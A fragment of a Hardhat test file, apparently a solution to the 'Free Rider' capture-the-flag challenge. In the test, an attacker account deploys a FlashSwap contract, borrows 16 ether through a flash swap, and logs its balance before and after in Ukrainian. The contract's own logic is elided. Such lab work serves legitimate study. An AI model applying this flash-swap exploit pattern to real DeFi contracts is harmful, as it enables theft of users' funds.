...
describe("[Challenge] Free Rider", function () {
	...
	it("Exploit", async function () {
		...
		//Trying to flash swap
		console.log(
			"Початковий баланс хакера: " +
				(await ethers.provider.getBalance(attacker.address)).toString()
		);

		flashSwapContract = await (
			await ethers.getContractFactory("FlashSwap", attacker)
		).deploy(
			this.weth.address,
			this.token.address,
		...
		await flashSwapContract.flashSwap(ethers.utils.parseEther("16"));

		console.log("флеш-своп проведений");

		console.log(
			"фінальний баланс хакера: " +
				(await ethers.provider.getBalance(attacker.address)).toString()
		);
	});
